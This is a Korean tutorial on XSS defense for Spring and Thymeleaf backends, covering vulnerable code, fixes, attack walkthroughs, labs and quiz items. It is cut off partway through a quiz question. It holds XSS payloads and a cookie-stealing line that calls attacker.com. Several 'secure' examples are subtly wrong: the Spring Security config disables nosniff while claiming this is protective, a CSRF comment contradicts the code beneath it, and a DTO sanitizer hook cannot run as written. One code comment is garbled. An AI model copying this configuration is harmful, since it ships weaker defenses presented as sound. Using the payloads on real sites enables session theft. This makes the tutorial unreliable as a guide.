# 백엔드 개발자의 XSS 방어 책임

---

## 🎯 핵심 질문

- API가 JSON을 응답해도 why Reflected XSS가 가능한가?
- `Content-Type: application/json`과 `X-Content-Type-Options: nosniff`의 차이는?
- Thymeleaf에서 `th:text`와 `th:utext`를 구분해야 하는 이유는?
- Spring Security 설정으로 XSS 방어를 자동화할 수 있는가?

---

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

### 네이버 블로그 HTML 이스케이핑 누락 (2014)
네이버 블로그의 검색 기능에서 검색어가 HTML에 직접 렌더링되었습니다. 백엔드에서 JSON으로 응답했지만, 프론트엔드가 `innerHTML`로 처리하면서 Reflected XSS가 발생했습니다. 사용자의 블로그 주소와 파일 목록을 탈취할 수 있었습니다.

### 카카오톡 웹 버전 XSS (2016)
카카오톡 웹 서비스에서 메시지가 DB에 저장되지 않은 상태로 즉시 DOM에 렌더링되었습니다. 서버는 정상 응답을 보냈지만, 클라이언트의 JavaScript에서 검증 없이 `innerHTML` 조작으로 인해 Stored XSS 효과를 낼 수 있었습니다.

### 우리카드 간편결제 XSS (2017)
우리카드의 결제 페이지에서 상품명이 매개변수로 전달되었고, 서버가 HTML로 렌더링했습니다. 백엔드에서 이스케이핑을 하지 않아 상품명에 `<script>alert('test')</script>`를 입력하면 결제 페이지에서 실행되었습니다.

---

## 😱 취약한 코드 (Before — 원리를 모를 때의 구현)

### 1. 응답 형식을 JSON으로 했지만 여전히 위험한 경우

**취약한 Spring Controller**
```java
@RestController
@RequestMapping("/api")
public class ProductController {
    
    @GetMapping("/search")
    public ResponseEntity<?> search(@RequestParam String keyword) {
        // ❌ 문제: JSON으로 응답했지만 응답 헤더가 잘못됨
        List<Product> results = productService.search(keyword);
        
        String jsonResponse = "{\"keyword\":\"" + keyword + "\",\"results\":" + 
                              new ObjectMapper().writeValueAsString(results) + "}";
        
        return ResponseEntity.ok()
            .contentType(MediaType.TEXT_PLAIN) // ❌ TEXT_PLAIN으로 설정
            .body(jsonResponse);
    }
    
    @PostMapping("/comment")
    public ResponseEntity<?> addComment(@RequestBody String comment) {
        // ❌ 문제: JSON 응답이지만 X-Content-Type-Options 헤더 없음
        Map<String, Object> response = new HashMap<>();
        response.put("comment", comment); // 이스케이핑 없음
        response.put("status", "success");
        
        return ResponseEntity.ok()
            .contentType(MediaType.APPLICATION_JSON)
            // X-Content-Type-Options 헤더 없음! IE에서 MIME 스니핑 발생
            .body(response);
    }
}
```

**공격 시나리오**
```
1. Content-Type이 TEXT_PLAIN일 때
   GET /api/search?keyword=<img src=x onerror="alert('XSS')">
   
   응답:
   Content-Type: text/plain
   {"keyword":"<img src=x onerror=\"alert('XSS')\">","results":[]}
   
   IE 브라우저:
   - Content-Type을 무시하고 콘텐츠 분석
   - <img> 태그 발견 → HTML로 해석
   - XSS 공격 성공!

2. X-Content-Type-Options 헤더 없을 때
   GET /api/comment (POST)
   Content-Type: application/json
   {"comment":"<script>alert('XSS')</script>"}
   
   IE 또는 Edge (구형):
   - MIME 타입 스니핑으로 HTML 판단
   - 스크립트 실행
```

---

### 2. Thymeleaf에서 이스케이핑을 무시한 경우

**취약한 Thymeleaf Template**
```html
<!-- user-profile.html -->
<html>
<body>
    <!-- 상황 1: 검색 결과 페이지 -->
    <h1>검색 결과: <span th:utext="${searchQuery}"></span></h1>
    <!-- ❌ 문제: th:utext는 HTML 이스케이핑을 하지 않음
         searchQuery = "<img src=x onerror='fetch(...)'>일 때
         → 스크립트가 그대로 실행됨
    -->
    
    <!-- 상황 2: 사용자 프로필 -->
    <div class="bio">
        <th:block th:utext="#{user.bio(${user.nickname})}"></th:block>
    </div>
    <!-- ❌ 문제: i18n 메시지가 user.nickname을 포함할 때
         user.nickname = "<script>alert('XSS')</script>"
         → 스크립트 실행
    -->
    
    <!-- 상황 3: 에러 메시지 -->
    <div class="error" th:if="${error}">
        <th:block th:utext="${error.message}"></th:block>
    </div>
    <!-- ❌ 문제: 에러 메시지가 사용자 입력을 포함할 때
         error.message = "비밀번호는 <10글자 입니다"
         → 게시물 제목이 충돌하는 게시물입니다"
    -->
</body>
</html>
```

**Controller 코드**
```java
@Controller
@RequestMapping("/profile")
public class ProfileController {
    
    @GetMapping("/search")
    public String search(@RequestParam String q, Model model) {
        // ❌ 문제: 사용자 입력이 그대로 모델에 전달됨
        model.addAttribute("searchQuery", q);
        return "search-results";
    }
    
    @GetMapping("/{userId}")
    public String profile(@PathVariable Long userId, Model model) {
        User user = userService.findById(userId);
        
        // ❌ 문제: user.getNickname()이 DB에서 정제되지 않은 상태로 로드됨
        model.addAttribute("user", user);
        
        // ❌ 문제: HTML 콘텐츠를 그대로 전달
        String htmlContent = buildUserBio(user);
        model.addAttribute("bioHtml", htmlContent);
        
        return "profile";
    }
    
    private String buildUserBio(User user) {
        // ❌ 문제: 사용자 입력을 HTML 태그로 감싸면서 주입 공격 가능
        return "<div class='bio'>" + user.getBio() + "</div>";
        // user.getBio() = "<img src=x onerror='...'>"
        // 결과: <div class='bio'><img src=x onerror='...'></div>
    }
}
```

---

### 3. ResponseEntity 헤더를 잘못 설정한 경우

**취약한 Spring Configuration**
```java
@Configuration
public class WebConfig implements WebMvcConfigurer {
    
    @Override
    public void configureContentNegotiation(
            ContentNegotiationConfigurer configurer) {
        // ❌ 문제: 확장자로 콘텐츠 타입 결정
        configurer
            .ignoreAcceptHeader(false)
            .favorPathExtension(true) // 위험!
            .parameterName("mediaType")
            .useRegisteredExtensionsOnly(false) // 더블 위험!
            .defaultContentType(MediaType.APPLICATION_JSON)
            .mediaType("json", MediaType.APPLICATION_JSON)
            .mediaType("xml", MediaType.APPLICATION_XML)
            .mediaType("html", MediaType.TEXT_HTML); // URL 조작으로 HTML 강제 가능
    }
}

// 공격 URL
// GET /api/user/123.html
// → ContentNegotiation에 의해 TEXT_HTML로 응답
// → JSON이 HTML로 처리되어 XSS 가능
```

**취약한 Filter 설정**
```java
@Component
public class ResponseHeaderFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                   HttpServletResponse response,
                                   FilterChain filterChain) 
            throws ServletException, IOException {
        // ❌ 문제: 기본 헤더만 설정하고 API 응답 헤더는 설정하지 않음
        response.setHeader("X-Frame-Options", "DENY");
        response.setHeader("X-Content-Type-Options", "nosniff");
        // X-Content-Type-Options는 설정했지만...
        
        // ❌ 문제: 모든 응답에 Cache-Control이 설정되지 않음
        // 민감한 데이터가 캐시되어 다른 사용자에게 노출될 수 있음
        
        filterChain.doFilter(request, response);
    }
}
```

---

### 4. @ResponseBody와 ModelAndView의 혼용

**취약한 혼합 사용**
```java
@Controller
@RequestMapping("/pages")
public class PageController {
    
    @PostMapping("/create")
    @ResponseBody // ❌ 주의: @ResponseBody와 Model의 혼용
    public Map<String, String> createPage(@RequestParam String title,
                                          @RequestParam String content,
                                          Model model) {
        // @ResponseBody는 있지만 Model도 있음 (혼란 가능)
        Page page = new Page();
        page.setTitle(title); // 검증/이스케이핑 없음
        page.setContent(content); // 검증/이스케이핑 없음
        pageRepository.save(page);
        
        // ❌ 문제: 저장된 데이터를 그대로 응답
        Map<String, String> response = new HashMap<>();
        response.put("title", page.getTitle());
        response.put("content", page.getContent());
        return response;
    }
    
    @GetMapping("/{id}")
    public String viewPage(@PathVariable Long id, Model model) {
        Page page = pageRepository.findById(id).orElse(null);
        
        // ❌ 문제: 검증되지 않은 데이터를 Model에 추가
        model.addAttribute("page", page);
        
        return "page-view";
    }
}

// page-view.html
// <h1 th:utext="${page.title}"></h1> ❌ XSS 가능
// <div th:utext="${page.content}"></div> ❌ XSS 가능
```

---

## ✨ 방어 코드 (After — 공격 원리를 알고 설계한 구현)

### 1. JSON 응답 + 올바른 헤더 설정

**Spring REST Controller 방어**
```java
@RestController
@RequestMapping("/api")
public class ProductController {
    
    @Autowired
    private ProductService productService;
    @Autowired
    private HtmlSanitizer htmlSanitizer;
    
    @GetMapping("/search")
    public ResponseEntity<SearchResponse> search(@RequestParam String keyword) {
        // ✅ 1단계: 입력값 검증
        if (keyword == null || keyword.length() > 100) {
            throw new IllegalArgumentException("잘못된 검색어입니다");
        }
        
        // ✅ 2단계: 정규식으로 기본 검증
        if (!keyword.matches("^[\\w\\s\\-가-힣]*$")) {
            throw new IllegalArgumentException("허용되지 않는 문자가 있습니다");
        }
        
        // ✅ 3단계: 서비스에서 검색 수행
        List<Product> results = productService.search(keyword);
        
        // ✅ 4단계: JSON으로 응답
        SearchResponse response = new SearchResponse(keyword, results);
        
        return ResponseEntity.ok()
            .contentType(MediaType.APPLICATION_JSON) // JSON 명시
            .header("X-Content-Type-Options", "nosniff") // MIME 스니핑 방지
            .header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
            .body(response);
    }
    
    @PostMapping("/comment")
    public ResponseEntity<CommentResponse> addComment(
            @RequestBody @Valid CommentRequest request) {
        // ✅ 1단계: @Valid로 자동 검증
        String sanitized = htmlSanitizer.sanitize(request.getContent());
        
        // ✅ 2단계: 정제된 내용 저장
        Comment comment = new Comment();
        comment.setContent(sanitized);
        commentRepository.save(comment);
        
        // ✅ 3단계: 응답 생성
        CommentResponse response = new CommentResponse(comment.getId(), sanitized);
        
        return ResponseEntity.status(HttpStatus.CREATED)
            .contentType(MediaType.APPLICATION_JSON)
            .header("X-Content-Type-Options", "nosniff")
            .body(response);
    }
}

@Data
public class SearchResponse {
    private String query;
    private List<Product> results;
    private long timestamp = System.currentTimeMillis();
}

@Data
@Valid
public class CommentRequest {
    @NotBlank
    @Size(min = 1, max = 1000)
    private String content;
}

@Data
public class CommentResponse {
    private Long id;
    private String content;
}
```

---

### 2. Thymeleaf 안전한 사용법

**View Layer 방어**
```html
<!-- ✅ 안전한 Thymeleaf 패턴 -->

<!-- 1. 기본 원칙: th:text 사용 (자동 이스케이핑) -->
<h1 th:text="'검색 결과: ' + ${searchQuery}"></h1>
<!-- ${searchQuery} = "<img src=x onerror='...'>"일 때
     결과: 검색 결과: &lt;img src=x onerror=&#39;...&#39;&gt;
     (스크립트 실행 안 됨)
-->

<!-- 2. HTML이 필요한 경우: 미리 정제된 데이터만 사용 -->
<div th:utext="${sanitizedBio}"></div>
<!-- sanitizedBio는 백엔드에서 이미 jsoup으로 정제됨 -->

<!-- 3. 속성 주입: th:attr 대신 th:* 사용 -->
<a th:href="@{/profile/{id}(id=${user.id})}" th:text="${user.name}"></a>
<!-- th:href는 URL로 안전하게 이스케이핑 -->

<!-- 4. 메시지 인터폴레이션: 사용자 입력 주의 -->
<span th:text="#{validation.error(${fieldName})}"></span>
<!-- fieldName이 messages.properties에 이미 정의되어 있으면 안전
     만약 동적으로 생성되면 th:text 사용 -->

<!-- 5. 조건부 렌더링 -->
<div th:if="${showBio}">
    <h3>자기소개</h3>
    <div th:text="${user.bio}"></div>
</div>

<!-- 6. 반복 렌더링 -->
<ul>
    <li th:each="comment : ${comments}" th:text="${comment.content}"></li>
</ul>
```

**Controller 방어**
```java
@Controller
@RequestMapping("/profile")
public class ProfileController {
    
    @Autowired
    private HtmlSanitizer htmlSanitizer;
    
    @GetMapping("/search")
    public String search(@RequestParam String q, Model model) {
        // ✅ 방어 1: 입력값 검증
        if (q == null || q.isEmpty()) {
            return "redirect:/";
        }
        
        // ✅ 방어 2: 정규식 검증
        if (q.length() > 100 || !q.matches("^[\\w\\s\\-가-힣]*$")) {
            model.addAttribute("error", "잘못된 검색어입니다");
            return "search-error";
        }
        
        // ✅ 방어 3: Template에 그대로 전달 (th:text에서 이스케이핑됨)
        model.addAttribute("searchQuery", q);
        
        // ✅ 방어 4: 검색 결과 조회
        List<Product> results = productService.search(q);
        model.addAttribute("results", results);
        
        return "search-results";
    }
    
    @GetMapping("/{userId}")
    public String profile(@PathVariable Long userId, Model model) {
        User user = userService.findById(userId);
        if (user == null) {
            return "redirect:/";
        }
        
        // ✅ 방어 1: DB에서 로드한 데이터는 이미 검증됨
        // (첫 저장 시 입력 검증 및 정제 수행)
        model.addAttribute("user", user);
        
        // ✅ 방어 2: HTML 콘텐츠가 필요한 경우 미리 정제
        String bioHtml = htmlSanitizer.sanitize(user.getBio());
        model.addAttribute("bioHtml", bioHtml);
        
        return "profile";
    }
}
```

---

### 3. 전역 Response 헤더 설정 (Spring Security)

**Spring Security Configuration**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // ✅ XSS 방어 헤더 설정
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; " +
                                    "script-src 'self' trusted.cdn.com; " +
                                    "style-src 'self' 'unsafe-inline'; " +
                                    "img-src 'self' data: https:; " +
                                    "font-src 'self'; " +
                                    "connect-src 'self' api.example.com;")
                    .reportUri("/api/csp-report")
                )
                .xssProtection(xss -> xss
                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ON_WITH_MODE_BLOCK)
                )
                .frameOptions(frameOptions -> frameOptions
                    .deny()
                )
                .contentTypeOptions(contentTypeOptions -> contentTypeOptions
                    .disable() // 명시적으로 disable하면 X-Content-Type-Options: nosniff 불필요
                )
                .referrerPolicy(referrer -> referrer
                    .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_NO_REFERRER)
                )
            )
            
            // ✅ CSRF 보호
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .ignoringRequestMatchers(
                    "/api/**", // API는 상태 변경 시 CSRF 토큰 필요
                    "/webhook/**"
                )
            )
            
            // ✅ 기본 인증 설정
            .authorizeHttpRequests(authz -> authz
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
}
```

**Content Security Policy (CSP) 설정**
```java
@Configuration
public class CspConfig {
    
    @Bean
    public HeaderWriter contentSecurityPolicyHeaderWriter() {
        return new StaticHeadersWriter(
            "Content-Security-Policy",
            "default-src 'self'; " +
            "script-src 'self' 'nonce-{nonce}'; " + // nonce 기반 인라인 스크립트 허용
            "style-src 'self' 'unsafe-inline'; " +
            "img-src 'self' data: https:; " +
            "font-src 'self' fonts.googleapis.com; " +
            "connect-src 'self' api.example.com; " +
            "frame-ancestors 'none'; " +
            "base-uri 'self'; " +
            "form-action 'self'; " +
            "upgrade-insecure-requests;"
        );
    }
}
```

---

### 4. HTML 정제 유틸리티

**HtmlSanitizer 구현**
```java
@Component
public class HtmlSanitizer {
    
    private static final Whitelist WHITELIST = Whitelist.basic()
        .addTags("section", "article", "header", "footer", "nav")
        .addAttributes("a", "href", "title")
        .addAttributes("img", "src", "alt", "width", "height")
        .addProtocols("a", "href", "ftp", "http", "https", "mailto")
        .addProtocols("img", "src", "http", "https", "data");
    
    public String sanitize(String input) {
        if (input == null || input.isEmpty()) {
            return "";
        }
        
        // 1단계: Jsoup으로 정제
        String cleaned = Jsoup.clean(input, "", WHITELIST, 
            new OutputSettings().indentAmount(0));
        
        // 2단계: 추가 검증 (선택사항)
        if (containsDangerousPatterns(cleaned)) {
            return escapeHtml(input); // HTML 태그 완전 제거
        }
        
        return cleaned;
    }
    
    private boolean containsDangerousPatterns(String input) {
        return input.matches(".*<(script|iframe|embed|object|form).*") ||
               input.toLowerCase().contains("javascript:") ||
               input.toLowerCase().contains("onerror") ||
               input.toLowerCase().contains("onload");
    }
    
    private String escapeHtml(String input) {
        return input
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;");
    }
    
    // Rich Text Editor 지원 (더 관대한 정제)
    public String sanitizeRichText(String input) {
        Whitelist richWhitelist = Whitelist.basic()
            .addTags("h1", "h2", "h3", "h4", "h5", "h6",
                    "p", "div", "span", "br", "hr",
                    "strong", "em", "u", "i", "b",
                    "ul", "ol", "li", "blockquote",
                    "pre", "code", "a", "img")
            .addAttributes("a", "href", "title", "target")
            .addAttributes("img", "src", "alt", "width", "height")
            .addProtocols("a", "href", "ftp", "http", "https", "mailto")
            .addProtocols("img", "src", "http", "https", "data");
        
        return Jsoup.clean(input, "", richWhitelist, 
            new OutputSettings().indentAmount(2).prettyPrint(true));
    }
}
```

**Content Validation DTO**
```java
@Data
public class UserProfileRequest {
    
    @NotBlank
    @Size(min = 2, max = 50)
    @Pattern(regexp = "^[\\w\\s\\-가-힣]*$", message = "허용되지 않는 문자가 포함되어 있습니다")
    private String nickname;
    
    @Size(max = 500)
    private String bio;
    
    @Email
    private String email;
    
    @URL
    @Nullable
    private String website;
    
    // 검증 후 정제
    @PostConstruct
    public void sanitize() {
        this.nickname = sanitizer.sanitize(nickname);
        this.bio = sanitizer.sanitize(bio);
    }
    
    @Autowired(required = false)
    private HtmlSanitizer sanitizer;
}
```

---

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### 공격 1: Content-Type 무시 (IE 호환성 모드)

```
공격자의 관점:

1단계: 취약점 발견
┌─────────────────────────────────────┐
│ GET /api/data?param=<script>alert(1)</script>
│ 
│ 서버 응답 헤더:
│ Content-Type: application/json
│ (X-Content-Type-Options 헤더 없음!)
│ 
│ 응답 본문:
│ {"data": "<script>alert(1)</script>"}
└─────────────────────────────────────┘

2단계: 브라우저 동작 분석
┌─────────────────────────────────────┐
│ 최신 브라우저 (Chrome, Firefox, Safari):
│ - Content-Type: application/json 준수
│ - JSON으로 파싱
│ - 스크립트 실행 안 됨 ✅
│
│ IE 11 호환성 모드:
│ - X-Content-Type-Options 헤더 없으면 MIME 스니핑
│ - 응답 본문에서 <script> 태그 발견
│ - HTML로 재해석
│ - 스크립트 실행 ❌ (공격 성공!)
└─────────────────────────────────────┘

3단계: 대규모 공격 계획
┌─────────────────────────────────────┐
│ 공격자: "많은 기업들이 IE 지원"
│ → IE 사용자만 목표로 삼음
│ → XSS 쿠키 탈취 성공률 높음
│ → 세션 하이재킹으로 계정 접근
└─────────────────────────────────────┘
```

### 공격 2: Thymeleaf th:utext 오용

```
공격자의 시나리오:

1단계: 사용자 프로필 수정 기능 찾기
┌─────────────────────────────────────┐
│ /profile/edit 페이지에서 "자기소개" 입력 필드
│ 최대 500글자 제한만 있고 콘텐츠 검증 없음
└─────────────────────────────────────┘

2단계: XSS 페이로드 작성
┌─────────────────────────────────────┐
│ 자기소개: <img src=x onerror="
│   fetch('https://attacker.com/steal?c=' + document.cookie)
│ ">
└─────────────────────────────────────┘

3단계: 프로필 저장
┌─────────────────────────────────────┐
│ POST /profile/edit
│ 
│ 서버 동작:
│ 1. 입력값 검증 없음
│ 2. DB에 그대로 저장
│ 3. user.bio = "<img src=x onerror=..."
└─────────────────────────────────────┘

4단계: 다른 사용자가 프로필 방문
┌─────────────────────────────────────┐
│ GET /profile/attacker_user_id
│ 
│ HTML 응답 (Thymeleaf):
│ <div th:utext="${user.bio}"></div>
│ 
│ 렌더링됨:
│ <div><img src=x onerror="fetch(...)"></div>
│
│ 브라우저 실행:
│ 1. <img> 태그 파싱
│ 2. src=x는 존재하지 않음
│ 3. onerror 이벤트 발생
│ 4. fetch() 실행
│ 5. document.cookie가 attacker.com으로 전송됨
│ 6. 방문자의 세션 토큰 탈취 완료
└─────────────────────────────────────┘

5단계: 광범위한 피해 확산
┌─────────────────────────────────────┐
│ 100명의 사용자가 attacker의 프로필 방문
│ → 100명의 쿠키가 모두 탈취됨
│ → 100명의 계정으로 로그인 가능
│ → 대규모 개인정보 도용
└─────────────────────────────────────┘
```

---

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실험 1: Content-Type 헤더 차이 테스트

**Step 1: 취약한 API 구성**
```java
@RestController
public class VulnerableApiController {
    
    @GetMapping("/vulnerable")
    public ResponseEntity<String> vulnerable(@RequestParam String data) {
        String json = "{\"result\":\"" + data + "\"}";
        return ResponseEntity.ok()
            .contentType(MediaType.TEXT_PLAIN) // ❌ 취약
            .body(json);
    }
    
    @GetMapping("/safe")
    public ResponseEntity<String> safe(@RequestParam String data) {
        String json = "{\"result\":\"" + escapeJson(data) + "\"}";
        return ResponseEntity.ok()
            .contentType(MediaType.APPLICATION_JSON) // ✅ 안전
            .header("X-Content-Type-Options", "nosniff")
            .body(json);
    }
    
    private String escapeJson(String input) {
        return input.replace("\"", "\\\"")
                   .replace("<", "\\u003c")
                   .replace(">", "\\u003e");
    }
}
```

**Step 2: 공격 테스트**
```bash
# Test 1: TEXT_PLAIN 응답
curl -v "http://localhost:8080/vulnerable?data=<img%20src=x%20onerror=%22alert(%27XSS%27)%22>"

# 응답:
# Content-Type: text/plain
# {"result":"<img src=x onerror="alert('XSS')">"}
# IE 호환성 모드: XSS 실행 ❌

# Test 2: APPLICATION_JSON 응답
curl -v "http://localhost:8080/safe?data=<img%20src=x%20onerror=%22alert(%27XSS%27)%22>"

# 응답:
# Content-Type: application/json
# X-Content-Type-Options: nosniff
# {"result":"<img src=x onerror="alert('XSS')">"}
# 모든 브라우저: JSON으로 파싱, 스크립트 미실행 ✅
```

**Step 3: 브라우저 검증**
```html
<!-- test-xss.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>XSS 테스트</h1>
    
    <!-- 취약한 엔드포인트 -->
    <iframe id="vulnerable" src="http://localhost:8080/vulnerable?data=<img src=x onerror='alert(1)'>" style="display:none;"></iframe>
    
    <!-- 안전한 엔드포인트 -->
    <iframe id="safe" src="http://localhost:8080/safe?data=<img src=x onerror='alert(1)'>" style="display:none;"></iframe>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            console.log("IE 호환성 모드에서만 alert가 표시됩니다");
        });
    </script>
</body>
</html>
```

---

### 실험 2: Thymeleaf th:text vs th:utext

**Step 1: 컨트롤러 및 뷰 설정**
```java
@Controller
public class ThymeleafTestController {
    
    @GetMapping("/test-escape")
    public String testEscape(Model model) {
        String userInput = "<img src=x onerror=\"alert('XSS from th:utext')\">";
        
        model.addAttribute("userInput", userInput);
        model.addAttribute("sanitized", sanitizer.sanitize(userInput));
        
        return "escape-test";
    }
}
```

```html
<!-- escape-test.html -->
<html>
<head>
    <title>Thymeleaf Escaping Test</title>
</head>
<body>
    <h1>th:text vs th:utext 테스트</h1>
    
    <!-- Test 1: th:text (안전) -->
    <section>
        <h2>th:text 사용 (권장)</h2>
        <div th:text="${userInput}"></div>
        <!-- 렌더링 결과:
             &lt;img src=x onerror=&quot;alert(&#39;XSS from th:utext&#39;)&quot;&gt;
             화면에 표시됨 (스크립트 실행 안 됨)
        -->
    </section>
    
    <!-- Test 2: th:utext (위험) -->
    <section>
        <h2>th:utext 사용 (위험!)</h2>
        <div th:utext="${userInput}"></div>
        <!-- 렌더링 결과:
             <img src=x onerror="alert('XSS from th:utext')">
             alert() 실행됨! (XSS 성공)
        -->
    </section>
    
    <!-- Test 3: 정제된 데이터와 함께 th:utext -->
    <section>
        <h2>th:utext + 정제된 데이터 (안전)</h2>
        <div th:utext="${sanitized}"></div>
        <!-- 정제된 HTML만 포함되므로 안전 -->
    </section>
</body>
</html>
```

**Step 2: 실행 및 확인**
```bash
# 서버 실행
./mvnw spring-boot:run

# 브라우저에서 접속
http://localhost:8080/test-escape

# 관찰:
# - Test 1: HTML 태그가 텍스트로 표시됨 ✅
# - Test 2: alert() 팝업 표시 ❌
# - Test 3: 정제된 HTML만 렌더링 ✅
```

---

### 실험 3: Spring Security 헤더 검증

**Step 1: 헤더 확인 스크립트**
```javascript
// check-headers.js
async function checkSecurityHeaders() {
    const response = await fetch('http://localhost:8080/api/test');
    const headers = response.headers;
    
    const requiredHeaders = {
        'x-content-type-options': 'nosniff',
        'x-frame-options': 'DENY',
        'strict-transport-security': 'max-age=31536000',
        'content-security-policy': undefined
    };
    
    console.log("=== Security Headers Check ===");
    for (const [header, expectedValue] of Object.entries(requiredHeaders)) {
        const value = headers.get(header);
        const status = value ? '✅' : '❌';
        console.log(`${status} ${header}: ${value || 'MISSING'}`);
    }
}

checkSecurityHeaders();
```

**Step 2: 실행**
```bash
# Node.js에서 실행
node check-headers.js

# 또는 curl에서 확인
curl -i http://localhost:8080/api/test | grep -E "X-Content-Type-Options|X-Frame-Options|Strict-Transport-Security|Content-Security-Policy"
```

---

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 구분 | 공격 성공 조건 | 방어 성공 조건 |
|------|---|---|
| **응답 형식** | Content-Type: text/html 또는 text/plain | Content-Type: application/json + X-Content-Type-Options: nosniff |
| **템플릿 엔진** | th:utext에 검증 없는 사용자 입력 | 항상 th:text 사용, th:utext는 정제 데이터만 |
| **HTML 이스케이핑** | 없음 | `<` → `&lt;` 등 자동 변환 |
| **입력 검증** | 없음 | 정규식, 길이 제한, 타입 검증 |
| **HTML 정제** | 없음 | jsoup Whitelist로 안전한 태그만 허용 |
| **Content Security Policy** | 없음 | script-src 'self'로 외부 스크립트 차단 |
| **Cache 정책** | 민감한 데이터 캐시됨 | Cache-Control: no-store, must-revalidate |

---

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

### 1. JSON vs HTML 응답

**XSS 방어 자동화 (JSON)**
```
장점:
- MIME 타입 스니핑 불가능
- 구조화된 데이터 전송
- 프론트엔드에서 JSON.parse() 강제

단점:
- Server-Side Rendering(SSR) 불가능
- SEO 최적화 어려움
- 초기 페이지 로딩 느림
```

### 2. 입력 검증의 엄격함

**매우 엄격한 검증 (보안 우선)**
```
패턴: ^[a-zA-Z0-9]*$
영향: 한글, 특수 문자 사용 불가 (사용성 저하)

완화된 검증 (사용성 우선)**
패턴: ^[\\w\\s\\-가-힣]*$
영향: 더 많은 문자 허용하지만 위험 증가
```

### 3. Rich Text Editor 지원

**완벽한 XSS 방어 (HTML 금지)**
```javascript
document.getElementById('editor').textContent = userInput;
// 결과: HTML 태그 사용 불가능 (사용성 저하)
```

**절충안 (화이트리스트 사용)**
```java
Whitelist whitelist = Whitelist.basic()
    .addTags("b", "i", "u", "strong", "em")
    .addAttributes("a", "href");
// 결과: 기본 서식만 허용
```

---

## 📌 핵심 정리

### 백엔드 XSS 방어의 3단계

1. **입력 단계**
   ```
   검증 (Validation): 예상 형식인가?
   정제 (Sanitization): 위험한 콘텐츠 제거
   이스케이핑 (Escaping): 특수 문자 변환
   ```

2. **저장 단계**
   ```
   원본 데이터: 나중을 위해 보존
   또는
   정제된 데이터: 검색 최적화 (선택)
   ```

3. **출력 단계**
   ```
   th:text (기본): 자동 이스케이핑
   th:utext (필요시): 정제된 HTML만
   JSON: Content-Type 강제 + 헤더 명시
   ```

### 필수 Security Headers

```
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000
Cache-Control: no-store, no-cache
```

---

## 🤔 생각해볼 문제 (+ 해설)

### Q1. 다음 Controller는 XSS에 안전한가?

```java
@RestController
public class ApiController {
    @GetMapping("/api/data")
    public ResponseEntity<Map<String, String>> getData(@RequestParam String input) {
        Map<String, String> response = new HashMap<>();
        response.put("input", input);
        return ResponseEntity.ok(response); // @RestController이므로 Jackson이 JSON으로 변환
    }
}
```

**해설**
```
✅ 기본적으로 안전

이유:
1. @RestController가 자동으로 application/json 헤더 설정
2. Jackson이 Map을 JSON으로 직렬화
3. input 값이 JSON 문자열로 인코딩됨

하지만 개선 사항:
```java
return ResponseEntity.ok()
    .contentType(MediaType.APPLICATION_JSON)
    .header("X-Content-Type-Options", "nosniff") // 명시적 헤더
    .body(response);
```

그리고 input 값 검증 필요:
```java
if (input == null || input.length() > 100) {
    throw new IllegalArgumentException("Invalid input");
}
```
```

---

### Q2. Thymeleaf에서 어떤 방식이 더 안전한가?

```html
<!-- 방식 A -->
<div th:text="${user.name}"></div>

<!-- 방식 B -->
<div th:inline="text">
    Hello, [[${user.name}]]!
</div>

<!-- 방식 C -->
<div th:utext="@{/profile/{name}(name=${user.name})}"></div>
```

**해설**
```
방식 A: ✅ 가장 안전
- th:text는 명시적으로 이스케이핑
- 표준적인 방식

방식 B: ✅ 안전하지만 유의 필요
- [[...]]는 th:text와 동일 (이스케이핑)
- 읽기 어려울 수 있음

방식 C: ❌ 위험
- th:utext는 HTML로 렌더링
- @{...}는 URL용이지만 사용자 입력이 포함되면 위험
- 예: user.name = "x\"><script>alert('XSS')</script><a href=\""
  결과: <a href="/profile/x\"><script>alert('XSS')</script><a href=\"\">

권장: 항상 방식 A (th:text) 사용
```

---

### Q3. 이 코드는 왜 여전히 위험한가?

```java
@PostMapping("/comment")
public ResponseEntity<?> addComment(@RequestBody CommentRequest req) {
    String sanitized = Jsoup.clean(req.getContent(), Whitelist.basic());
    Comment comment = new Comment();
    comment.setContent(sanitized);
    commentRepository.save(comment);
    
    // 문제: 저장하고 바로 응답
    return ResponseEntity.ok(comment); // 정제되지 않은 원본이 응답될 수도?
}
```

**해설**
```
코드 자체는 안전하지만, 주의사항:

1. 응답에 원본이 포함되는가?
   - comment 객체에는 정제된 content만 포함됨 ✅
   - 따라서 응답도 안전

2. DB에서 나중에 조회할 때 안전한가?
   - 저장된 데이터는 이미 정제됨 ✅
   - th:text로 렌더링하면 추가 이스케이핑 발생
   - 중복 인코딩 가능 (예: & → &amp; → &amp;amp;)

개선 방안:
```java
// 원본을 저장하고, 필요시마다 정제
@Entity
public class Comment {
    private String rawContent;
    
    public String getSafeHtml() {
        return Jsoup.clean(rawContent, Whitelist.basic());
    }
}

// 응답 시 정제된 버전 전송
CommentDto dto = new CommentDto(
    comment.getId(),
    comment.getSafeHtml(), // 정제된 버전
    comment.getCreatedAt()
);
return ResponseEntity.ok(dto);
```
```

---

### Q4. 다음 Spring Security 설정에서 빠진 것은?

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
